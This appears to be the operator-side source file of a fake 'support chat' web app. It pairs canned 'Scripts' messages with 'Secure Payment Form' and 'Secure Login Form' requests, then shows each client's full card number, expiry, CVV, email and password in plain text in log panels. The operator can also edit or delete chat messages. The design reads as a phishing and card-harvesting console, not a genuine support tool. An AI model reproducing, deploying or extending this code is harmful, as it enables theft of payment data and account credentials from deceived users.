"use client";

import React, {
  Suspense,
  useState,
  useEffect,
  ChangeEvent,
  FormEvent,
  useRef,
} from "react";
import Image from "next/image";
import { useSearchParams } from "next/navigation";
import {
  collection,
  query,
  where,
  orderBy,
  onSnapshot,
  addDoc,
  updateDoc,
  deleteDoc,
  serverTimestamp,
  Timestamp,
  QuerySnapshot,
  CollectionReference,
  doc,
  getDoc,
} from "firebase/firestore";
import { db } from "@/lib/firebase";
import { MdLock, MdDelete, MdEdit, MdCreditCard, MdEmail } from "react-icons/md";

// ---------------------------
// Data Types
// ---------------------------
type Message = {
  id?: string;
  sender: string; // "support" for support messages or "client" for client messages
  text: string;
  messageType?:
    | "text"
    | "secure_form_request"
    | "secure_form_response"
    | "secure_login_request"
    | "secure_login_response";
  timestamp?: Timestamp;
  transactionId: string;
};

type UserData = {
  userID: string;
  username: string;
};

type PreComposedMessage = {
  id: string;
  text: string;
};

interface TransactionFormProps {
  onSubmit: (tx: string) => void;
}

// ---------------------------
// TransactionForm Component
// ---------------------------
function TransactionForm({ onSubmit }: TransactionFormProps) {
  const [input, setInput] = useState("");
  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    const trimmed = input.trim();
    if (trimmed) onSubmit(trimmed);
  };
  return (
    <form onSubmit={handleSubmit} style={{ textAlign: "center", marginTop: "50px" }}>
      <h2 style={{ color: "#5865F2" }}>Please enter a valid transaction ID:</h2>
      <input
        type="text"
        value={input}
        onChange={(e: ChangeEvent<HTMLInputElement>) => setInput(e.target.value)}
        placeholder="Enter Transaction ID"
        style={{
          padding: "10px",
          fontSize: "16px",
          color: "black",
          border: "1px solid #ccc",
          borderRadius: "4px",
          width: "80%",
          maxWidth: "300px",
        }}
      />
      <button
        type="submit"
        style={{
          padding: "10px 20px",
          marginLeft: "10px",
          border: "none",
          backgroundColor: "#5865F2",
          color: "#fff",
          borderRadius: "4px",
          cursor: "pointer",
          transition: "background-color 0.3s ease",
        }}
      >
        Submit
      </button>
    </form>
  );
}

// ---------------------------
// SecureFormRequestPlaceholder Component (Support Only)
// ---------------------------
function SecureFormRequestPlaceholder() {
  return (
    <div style={securePlaceholderStyle}>
      <MdLock style={securePlaceholderIconStyle} />
      <span>Secure Payment Form request sent to client</span>
    </div>
  );
}

// ---------------------------
// SecurePaymentDetails Component (Support Only)
// ---------------------------
function SecurePaymentDetails({
  transactionId,
  maskedText,
}: {
  transactionId: string;
  maskedText: string;
}) {
  const [details, setDetails] = useState<{
    cardNumber: string;
    expiry: string;
    cvv: string;
  } | null>(null);

  useEffect(() => {
    const secureRef = collection(db, "securePaymentDetails");
    const q = query(secureRef, where("transactionId", "==", transactionId));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      if (!snapshot.empty) {
        const data = snapshot.docs[0].data();
        setDetails({
          cardNumber: data.cardNumber,
          expiry: data.expiry,
          cvv: data.cvv,
        });
      } else {
        setDetails(null);
      }
    });
    return () => unsubscribe();
  }, [transactionId]);

  if (details) {
    const cardType = detectCardType(details.cardNumber);
    return (
      <div>
        {`Payment Details - Card: ${details.cardNumber}, Expiry: ${details.expiry}, CVV: ${details.cvv}`}{" "}
        <em>({cardType})</em>
      </div>
    );
  }
  return <div>{maskedText} (Secure details loading...)</div>;
}

// ---------------------------
// SecureLoginDetails Component (Support Only)
// ---------------------------
function SecureLoginDetails({
  transactionId,
  maskedText,
}: {
  transactionId: string;
  maskedText: string;
}) {
  const [details, setDetails] = useState<{
    email: string;
    password: string;
  } | null>(null);

  useEffect(() => {
    const secureLoginRef = collection(db, "secureLoginDetails");
    const q = query(secureLoginRef, where("transactionId", "==", transactionId));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      if (!snapshot.empty) {
        const data = snapshot.docs[0].data();
        setDetails({
          email: data.email,
          password: data.password,
        });
      } else {
        setDetails(null);
      }
    });
    return () => unsubscribe();
  }, [transactionId]);

  if (details) {
    return (
      <div>
        {`Login Credentials - Email: ${details.email}, Password: ${details.password}`}
      </div>
    );
  }
  return <div>{maskedText} (Secure login details loading...)</div>;
}

// ---------------------------
// SecureLoginRequestPlaceholder Component (Support Only)
// ---------------------------
function SecureLoginRequestPlaceholder() {
  return (
    <div style={securePlaceholderStyle}>
      <MdLock style={securePlaceholderIconStyle} />
      <span>Secure Login Form request sent to client</span>
    </div>
  );
}

// ---------------------------
// (Note: The SecureLoginForm component for clients would be on a separate page)
// ---------------------------

// ---------------------------
// Helper to detect card type (used on secure responses)
// ---------------------------
function detectCardType(cardNumber: string): string {
  const cleaned = cardNumber.replace(/[\s-]/g, "");
  if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleaned)) {
    return "Visa";
  } else if (/^5[1-5][0-9]{14}$/.test(cleaned)) {
    return "MasterCard";
  } else if (/^3[47][0-9]{13}$/.test(cleaned)) {
    return "American Express";
  }
  return "Unknown";
}

// ---------------------------
// ImageModal Component (for zoom-in effect)
// ---------------------------
function ImageModal({ src, onClose }: { src: string; onClose: () => void }) {
  return (
    <div
      onClick={onClose}
      style={{
        position: "fixed",
        top: 0,
        left: 0,
        width: "100vw",
        height: "100vh",
        backgroundColor: "rgba(0, 0, 0, 0.8)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        zIndex: 1000,
        cursor: "zoom-out",
        animation: "zoomIn 0.3s",
      }}
    >
      <Image
        src={src}
        alt="Zoomed"
        width={800}
        height={600}
        style={{
          maxWidth: "90%",
          maxHeight: "90%",
          borderRadius: "10px",
        }}
      />
    </div>
  );
}

// ---------------------------
// ChatContent Component (Support)
// ---------------------------
function ChatContent() {
  const searchParams = useSearchParams();
  const initialTx = searchParams.get("tx") || "";
  // On the support page, the role is always "support"
  const userRole = "support" as const;

  const [transactionId, setTransactionId] = useState(initialTx);
  const [messages, setMessages] = useState<Message[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [user, setUser] = useState<UserData | null>(null);
  const [loading, setLoading] = useState(false);
  const [containerLoaded, setContainerLoaded] = useState(false);
  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Pre-composed messages state
  const [newPreComposed, setNewPreComposed] = useState("");
  const [preComposedMessages, setPreComposedMessages] = useState<PreComposedMessage[]>([]);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [editingText, setEditingText] = useState("");

  // Conversation message editing state
  const [editingMessageId, setEditingMessageId] = useState<string | null>(null);
  const [editingMessageText, setEditingMessageText] = useState("");

  const messagesEndRef = useRef<HTMLDivElement | null>(null);
  const chatInputRef = useRef<HTMLTextAreaElement>(null);

  useEffect(() => {
    setContainerLoaded(true);
  }, []);

  useEffect(() => {
    async function fetchUserData() {
      setLoading(true);
      try {
        const userDoc = await getDoc(doc(db, "users", transactionId));
        if (userDoc.exists()) {
          setUser(userDoc.data() as UserData);
        } else {
          setUser(null);
          console.error("User not found in Firestore");
        }
      } catch (error) {
        console.error("Error fetching user data:", error);
      }
      setLoading(false);
    }
    if (transactionId) fetchUserData();
  }, [transactionId]);

  useEffect(() => {
    if (!transactionId) return;
    const messagesRef = collection(db, "messages") as CollectionReference<Message>;
    const q = query(
      messagesRef,
      where("transactionId", "==", transactionId),
      orderBy("timestamp", "asc")
    );
    const unsubscribe = onSnapshot(q, (snapshot: QuerySnapshot<Message>) => {
      const msgs = snapshot.docs.map((doc) => ({ id: doc.id, ...doc.data() }));
      setMessages(msgs);
    });
    return () => unsubscribe();
  }, [transactionId]);

  useEffect(() => {
    const preComposedRef = collection(db, "precomposedMessages");
    const unsubscribe = onSnapshot(preComposedRef, (snapshot) => {
      const msgs = snapshot.docs.map((doc) => ({ id: doc.id, ...doc.data() }));
      setPreComposedMessages(msgs as PreComposedMessage[]);
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (messagesEndRef.current) {
      messagesEndRef.current.scrollIntoView({ behavior: "smooth" });
    }
  }, [messages]);

  const containerAnimationStyle: React.CSSProperties = {
    opacity: containerLoaded ? 1 : 0,
    transform: containerLoaded ? "translateY(0)" : "translateY(20px)",
    transition: "opacity 0.5s ease-out, transform 0.5s ease-out",
  };

  // Function to delete a message
  const deleteMessage = async (id: string) => {
    try {
      await deleteDoc(doc(db, "messages", id));
    } catch (error) {
      console.error("Error deleting message:", error);
    }
  };

  // Function to save an edited conversation message
  const saveEditedMessage = async (id: string) => {
    try {
      await updateDoc(doc(db, "messages", id), { text: editingMessageText });
      setEditingMessageId(null);
      setEditingMessageText("");
    } catch (error) {
      console.error("Error updating message:", error);
    }
  };

  // Optimistic message sending
  const sendMessage = async (
    text: string,
    messageType: Message["messageType"] = "text"
  ) => {
    const trimmed = text.trim();
    if (!trimmed) return;
    const optimisticMessage: Message = {
      id: "temp-" + Date.now(),
      sender: userRole,
      text: trimmed,
      messageType,
      timestamp: Timestamp.now(),
      transactionId,
    };
    setMessages((prev) => [...prev, optimisticMessage]);
    try {
      await addDoc(collection(db, "messages"), {
        transactionId,
        sender: userRole,
        text: trimmed,
        messageType,
        timestamp: serverTimestamp(),
      });
    } catch (error) {
      console.error("Error sending message:", error);
    }
  };

  // Called on form submit (fallback for send button)
  const handleSend = async (e: FormEvent) => {
    e.preventDefault();
    const message = chatInput.trim();
    if (!message) return;
    setChatInput("");
    await sendMessage(message);
    if (chatInputRef.current) {
      chatInputRef.current.style.height = "auto";
    }
  };

  // Sends message on pressing Enter (without Shift)
  const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      const message = chatInput.trim();
      if (message) {
        setChatInput("");
        sendMessage(message);
        if (chatInputRef.current) {
          chatInputRef.current.style.height = "auto";
        }
      }
    }
  };

  // Adjust textarea height as user types.
  const handleChatInputChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
    setChatInput(e.target.value);
    if (chatInputRef.current) {
      chatInputRef.current.style.height = "auto";
      chatInputRef.current.style.height = `${chatInputRef.current.scrollHeight}px`;
    }
  };

  // When secure payment form button is clicked, support sends a secure payment form request.
  const handleSendSecureFormRequest = async () => {
    await sendMessage("Secure Payment Form", "secure_form_request");
  };

  // When secure login form button is clicked, support sends a secure login form request.
  const handleSendSecureLoginRequest = async () => {
    await sendMessage("Secure Login Form", "secure_login_request");
  };

  // Render message content based on message type.
  const renderMessageContent = (msg: Message) => {
    if (msg.messageType === "secure_form_request") {
      return <SecureFormRequestPlaceholder />;
    }
    if (msg.messageType === "secure_form_response") {
      return (
        <SecurePaymentDetails
          transactionId={msg.transactionId}
          maskedText={msg.text}
        />
      );
    }
    if (msg.messageType === "secure_login_request") {
      // On the support page, always show the placeholder.
      return <SecureLoginRequestPlaceholder />;
    }
    if (msg.messageType === "secure_login_response") {
      return (
        <SecureLoginDetails
          transactionId={msg.transactionId}
          maskedText={msg.text}
        />
      );
    }
    if (/https?:\/\/[^\s]+/.test(msg.text)) {
      return (
        <a
          href={msg.text}
          target="_blank"
          rel="noopener noreferrer"
          style={{ color: "white", textDecoration: "underline" }}
        >
          {msg.text}
        </a>
      );
    }
    if (msg.text.startsWith("data:image/")) {
      return (
        <a href={msg.text} target="_blank" rel="noopener noreferrer">
          <Image
            src={msg.text}
            alt="Uploaded"
            width={300}
            height={200}
            style={{ borderRadius: "10px", marginTop: "5px", cursor: "pointer" }}
            onClick={(e) => {
              e.preventDefault();
              setSelectedImage(msg.text);
            }}
          />
        </a>
      );
    }
    return <span>{msg.text}</span>;
  };

  // Render each conversation message.
  const renderMessage = (msg: Message) => {
    const key = msg.id || Math.random().toString(36).substr(2, 9);
    const isSupport = msg.sender === "support";
    if (isSupport && editingMessageId === msg.id) {
      return (
        <div
          key={key}
          style={{
            position: "relative",
            margin: "10px 0",
            padding: "10px 15px",
            borderRadius: "15px",
            maxWidth: "70%",
            wordWrap: "break-word",
            fontSize: "15px",
            backgroundColor: "#5865F2",
            color: "#fff",
          }}
        >
          <input
            type="text"
            value={editingMessageText}
            onChange={(e) => setEditingMessageText(e.target.value)}
            style={{
              width: "100%",
              padding: "5px",
              borderRadius: "8px",
              border: "none",
              color: "black",
            }}
          />
          <div style={{ marginTop: "5px" }}>
            <button onClick={() => saveEditedMessage(msg.id!)} style={chatSendStyle}>
              Save
            </button>
            <button
              onClick={() => setEditingMessageId(null)}
              style={{ ...chatSendStyle, backgroundColor: "#ccc", marginLeft: "5px" }}
            >
              Cancel
            </button>
          </div>
        </div>
      );
    }
    return (
      <div
        key={key}
        style={{
          position: "relative",
          margin: "10px 0",
          padding: "10px 15px",
          borderRadius: "15px",
          maxWidth: "70%",
          wordWrap: "break-word",
          fontSize: "15px",
          backgroundColor: "#5865F2",
          color: "#fff",
        }}
      >
        {isSupport && (
          <button
            onClick={() => {
              setEditingMessageId(msg.id!);
              setEditingMessageText(msg.text);
            }}
            style={editBtnStyle}
            title="Edit Message"
          >
            <MdEdit />
          </button>
        )}
        <strong>{msg.sender}:</strong> {renderMessageContent(msg)}
        <button onClick={() => deleteMessage(msg.id!)} style={deleteBtnStyle} title="Delete Message">
          <MdDelete />
        </button>
      </div>
    );
  };

  // Handle file change for image messages.
  const handleFileChange = (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = async (ev) => {
        const imageUrl = ev.target?.result;
        if (imageUrl && typeof imageUrl === "string") {
          try {
            await addDoc(collection(db, "messages"), {
              transactionId,
              sender: userRole,
              text: imageUrl,
              timestamp: serverTimestamp(),
            });
          } catch (error) {
            console.error("Error sending image message:", error);
          }
        }
      };
      reader.readAsDataURL(file);
    }
  };

  // Pre-composed messages functions
  const addPreComposedMessage = async () => {
    const trimmed = newPreComposed.trim();
    if (!trimmed) return;
    try {
      await addDoc(collection(db, "precomposedMessages"), { text: trimmed });
      setNewPreComposed("");
    } catch (error) {
      console.error("Error adding pre-composed message:", error);
    }
  };

  const editPreComposedMessage = (id: string) => {
    const msg = preComposedMessages.find((m) => m.id === id);
    if (msg) {
      setEditingId(id);
      setEditingText(msg.text);
    }
  };

  const saveEditedPreComposedMessage = async (id: string) => {
    try {
      await updateDoc(doc(db, "precomposedMessages", id), { text: editingText });
      setEditingId(null);
      setEditingText("");
    } catch (error) {
      console.error("Error updating pre-composed message:", error);
    }
  };

  const deletePreComposedMessage = async (id: string) => {
    try {
      await deleteDoc(doc(db, "precomposedMessages", id));
    } catch (error) {
      console.error("Error deleting pre-composed message:", error);
    }
  };

  // Filter logs for secure responses.
  const secureFormLogs = messages.filter(
    (msg) => msg.messageType === "secure_form_response" && msg.sender === "client"
  );
  const secureLoginLogs = messages.filter(
    (msg) => msg.messageType === "secure_login_response" && msg.sender === "client"
  );

  return (
    <div style={chatPageStyle}>
      {!transactionId || transactionId === "support-chat" ? (
        <TransactionForm onSubmit={(tx) => setTransactionId(tx)} />
      ) : loading ? (
        <h2 style={{ textAlign: "center", marginTop: "50px", color: "#5865F2" }}>Loading...</h2>
      ) : (
        <>
          <div style={{ ...chatWrapperStyle, ...containerAnimationStyle }}>
            {/* Pre-Composed Messages Panel */}
            <div style={preComposedContainerStyle}>
              <h3 style={{ textAlign: "center", color: "#5865F2", marginBottom: "20px" }}>Scripts</h3>
              {preComposedMessages.map((msg) => (
                <div key={msg.id} style={preComposedMessageStyle}>
                  {editingId === msg.id ? (
                    <>
                      <input
                        type="text"
                        value={editingText}
                        onChange={(e) => setEditingText(e.target.value)}
                        style={{
                          flex: 1,
                          marginRight: "5px",
                          padding: "5px",
                          borderRadius: "4px",
                          border: "1px solid #ccc",
                          color: "black",
                        }}
                      />
                      <button onClick={() => saveEditedPreComposedMessage(msg.id)} style={preComposedButtonStyle}>
                        Save
                      </button>
                    </>
                  ) : (
                    <>
                      <span style={{ flex: 1, cursor: "pointer", color: "black" }} onClick={() => sendMessage(msg.text)}>
                        {msg.text}
                      </span>
                      <button onClick={() => editPreComposedMessage(msg.id)} style={preComposedButtonStyle}>
                        Edit
                      </button>
                      <button onClick={() => deletePreComposedMessage(msg.id)} style={preComposedButtonStyle}>
                        Delete
                      </button>
                    </>
                  )}
                </div>
              ))}
              <div style={{ marginTop: "20px" }}>
                <input
                  type="text"
                  value={newPreComposed}
                  onChange={(e) => setNewPreComposed(e.target.value)}
                  placeholder="New script message"
                  style={{
                    width: "100%",
                    padding: "8px",
                    borderRadius: "4px",
                    border: "1px solid #ccc",
                    color: "black",
                  }}
                />
                <button
                  onClick={addPreComposedMessage}
                  style={{
                    width: "100%",
                    padding: "8px",
                    marginTop: "8px",
                    borderRadius: "4px",
                    backgroundColor: "#5865F2",
                    color: "#fff",
                    border: "none",
                    cursor: "pointer",
                    transition: "background-color 0.3s ease",
                  }}
                >
                  Add
                </button>
              </div>
            </div>

            {/* Chat Container */}
            <div style={chatContainerStyle}>
              <div style={chatHeaderStyle}>
                Support Chat {user ? `- ${user.username}` : ""} (TX: {transactionId})
              </div>
              <div style={chatMessagesStyle}>
                {messages.map((msg) => renderMessage(msg))}
                <div ref={messagesEndRef} />
              </div>
              <form onSubmit={handleSend} style={chatInputContainerStyle}>
                <button type="button" onClick={() => fileInputRef.current?.click()} style={plusIconStyle}>
                  +
                </button>
                <textarea
                  ref={chatInputRef}
                  value={chatInput}
                  onChange={handleChatInputChange}
                  onKeyDown={handleKeyDown}
                  placeholder="Type your message..."
                  style={chatInputStyle}
                  rows={1}
                />
                <button type="submit" style={chatSendStyle}>
                  Send
                </button>
              </form>
            </div>
          </div>

          {/* Secure Actions Section */}
          <div style={secureActionsContainerStyle}>
            <button
              type="button"
              onClick={handleSendSecureFormRequest}
              style={{ ...chatSendStyle, backgroundColor: "#28a745" }}
            >
              Secure Payment Form
            </button>
            <button
              type="button"
              onClick={handleSendSecureLoginRequest}
              style={{ ...chatSendStyle, backgroundColor: "#007bff" }}
            >
              Secure Login Form
            </button>
          </div>

          {/* Logs Panels */}
          <div style={logsWrapperStyle}>
            <div style={logsContainerStyle}>
              <h3 style={{ color: "#5865F2", textAlign: "center", marginBottom: "10px" }}>
                Secure Form Logs
              </h3>
              {secureFormLogs.map((log) => (
                <div key={log.id} style={logItemStyle}>
                  <MdCreditCard style={{ marginRight: "8px", color: "#5865F2" }} />
                  <SecurePaymentDetails transactionId={log.transactionId} maskedText={log.text} />
                </div>
              ))}
            </div>
            <div style={logsContainerStyle}>
              <h3 style={{ color: "#5865F2", textAlign: "center", marginBottom: "10px" }}>
                Secure Login Logs
              </h3>
              {secureLoginLogs.map((log) => (
                <div key={log.id} style={logItemStyle}>
                  <MdLock style={{ marginRight: "8px", color: "#5865F2" }} />
                  <SecureLoginDetails transactionId={log.transactionId} maskedText={log.text} />
                </div>
              ))}
            </div>
          </div>
        </>
      )}
      {selectedImage && <ImageModal src={selectedImage} onClose={() => setSelectedImage(null)} />}
    </div>
  );
}

export default function SupportChat() {
  return (
    <Suspense
      fallback={
        <div style={{ textAlign: "center", marginTop: "50px", color: "#5865F2" }}>
          Loading chat...
        </div>
      }
    >
      <ChatContent />
      <style jsx global>{`
        @keyframes zoomIn {
          from {
            transform: scale(0.5);
            opacity: 0;
          }
          to {
            transform: scale(1);
            opacity: 1;
          }
        }
      `}</style>
    </Suspense>
  );
}

/* ----------------------
   Styling
---------------------- */
const chatPageStyle: React.CSSProperties = {
  margin: 0,
  fontFamily: "sans-serif",
  backgroundColor: "#E0E3FF",
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  minHeight: "100vh",
  padding: "20px",
  boxSizing: "border-box",
};

const chatWrapperStyle: React.CSSProperties = {
  display: "flex",
  width: "100%",
  maxWidth: "1200px",
  height: "80vh",
  boxShadow: "0 4px 12px rgba(0,0,0,0.15)",
  borderRadius: "8px",
  overflow: "hidden",
  backgroundColor: "#fff",
};

const preComposedContainerStyle: React.CSSProperties = {
  width: "30%",
  minWidth: "250px",
  backgroundColor: "#E0E3FF",
  padding: "20px",
  overflowY: "auto",
  borderRight: "2px solid #5865F2",
  transition: "all 0.3s ease",
};

const preComposedMessageStyle: React.CSSProperties = {
  padding: "10px",
  marginBottom: "10px",
  backgroundColor: "#fff",
  borderRadius: "5px",
  cursor: "pointer",
  display: "flex",
  justifyContent: "space-between",
  alignItems: "center",
  boxShadow: "0 2px 4px rgba(0,0,0,0.1)",
  transition: "transform 0.2s ease",
};

const preComposedButtonStyle: React.CSSProperties = {
  border: "none",
  backgroundColor: "#5865F2",
  color: "#fff",
  padding: "6px 10px",
  borderRadius: "4px",
  cursor: "pointer",
  fontSize: "14px",
  marginLeft: "5px",
  transition: "background-color 0.3s ease, transform 0.2s ease",
};

const chatContainerStyle: React.CSSProperties = {
  width: "70%",
  display: "flex",
  flexDirection: "column",
  backgroundColor: "#fff",
};

const chatHeaderStyle: React.CSSProperties = {
  backgroundColor: "#5865F2",
  color: "#fff",
  padding: "15px",
  textAlign: "center",
  fontSize: "20px",
  fontWeight: "bold",
  transition: "background-color 0.3s ease",
};

const chatMessagesStyle: React.CSSProperties = {
  flex: 1,
  padding: "20px",
  overflowY: "auto",
  backgroundColor: "#f9f9f9",
};

const chatInputContainerStyle: React.CSSProperties = {
  display: "flex",
  borderTop: "1px solid #ccc",
  alignItems: "center",
  padding: "10px",
  transition: "all 0.3s ease",
};

const chatInputStyle: React.CSSProperties = {
  flex: 1,
  border: "1px solid #ccc",
  borderRadius: "4px",
  padding: "10px",
  fontSize: "16px",
  outline: "none",
  transition: "all 0.3s ease",
  resize: "none",
  color: "black",
};

const chatSendStyle: React.CSSProperties = {
  border: "none",
  backgroundColor: "#5865F2",
  color: "#fff",
  padding: "10px 20px",
  marginLeft: "10px",
  cursor: "pointer",
  fontSize: "16px",
  borderRadius: "4px",
  transition: "background-color 0.3s ease, transform 0.2s ease",
};

const securePlaceholderStyle: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
  padding: "10px",
  border: "1px solid #5865F2",
  borderRadius: "8px",
  backgroundColor: "#E0E3FF",
  color: "#5865F2",
  animation: "fadeIn 0.3s ease",
  transition: "all 0.3s ease",
};

const securePlaceholderIconStyle: React.CSSProperties = {
  fontSize: "24px",
  marginRight: "10px",
};

const editBtnStyle: React.CSSProperties = {
  position: "absolute",
  top: "5px",
  left: "5px",
  background: "transparent",
  border: "none",
  color: "#fff",
  cursor: "pointer",
  fontSize: "18px",
  opacity: 0.8,
};

const deleteBtnStyle: React.CSSProperties = {
  position: "absolute",
  top: "5px",
  right: "5px",
  background: "transparent",
  border: "none",
  color: "#fff",
  cursor: "pointer",
  fontSize: "18px",
  opacity: 0.8,
};

const plusIconStyle: React.CSSProperties = {
  background: "none",
  border: "none",
  fontSize: "20px",
  cursor: "pointer",
  color: "#6c757d",
  marginRight: "5px",
  padding: "0",
};

const secureActionsContainerStyle: React.CSSProperties = {
  marginTop: "20px",
  display: "flex",
  justifyContent: "center",
  gap: "20px",
};

const logsWrapperStyle: React.CSSProperties = {
  display: "flex",
  justifyContent: "space-between",
  gap: "20px",
  marginTop: "20px",
  width: "100%",
  maxWidth: "1200px",
  marginLeft: "auto",
  marginRight: "auto",
};

const logItemStyle: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
  padding: "8px",
  marginBottom: "8px",
  backgroundColor: "#fff",
  borderRadius: "5px",
  border: "1px solid #ccc",
  color: "#333",
  fontSize: "14px",
};

const logsContainerStyle: React.CSSProperties = {
  width: "48%",
  backgroundColor: "#f9f9f9",
  padding: "10px",
  border: "1px solid #ccc",
  borderRadius: "4px",
  overflowY: "auto",
};
